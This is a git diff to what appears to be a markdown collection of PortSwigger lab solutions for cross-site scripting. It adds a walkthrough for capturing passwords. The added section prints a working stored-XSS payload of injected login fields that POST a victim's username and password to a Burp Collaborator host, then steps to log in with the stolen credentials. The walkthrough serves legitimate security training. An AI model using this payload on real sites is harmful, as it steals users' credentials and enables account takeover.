@@ -15,6 +15,7 @@
 - [Reflected DOM XSS](#reflected-dom-xss)
 - [Stored DOM XSS](#stored-dom-xss)
 - [Exploiting cross-site scripting to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
+- [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
 
 ## Reflected XSS into HTML context with nothing encoded
 Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
@@ -169,7 +170,7 @@ Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/
 
 <!-- omit in toc -->
 ### Quick Solution
-There is a stored XSS in the comments, just add a ``fetch`` to the Burp Collaborator to get the ``cookie`` of the victim. Solution in the next section.
+There is a stored XSS in the comments, just add a ``fetch`` to the Burp Collaborator to get the ``cookie`` of the victim. Payload in the next section.
 
 <!-- omit in toc -->
 ### Solution
@@ -189,3 +190,28 @@ This script will make anyone who views the comment issue a POST request to burpc
 4. Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
 5. Take a note of the value of the victim's cookie in the POST body.
 6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.
+
+## Exploiting cross-site scripting to capture passwords
+Reference: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
+
+<!-- omit in toc -->
+### Quick Solution
+Exploit an XSS vulnerability in the comments to make anyone who views the comment to issue a POST request to the Burp Collaborator containing their username and password. Payload in the next section.
+
+<!-- omit in toc -->
+### Solution
+1. Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
+2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
+3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+```javascript
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their username and password.
+4. Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction.If you don't see any interactions listed, wait a few seconds and try again.
+5. Take a note of the value of the victim's username and password in the POST body.
+6. Use the credentials to log in as the victim user.
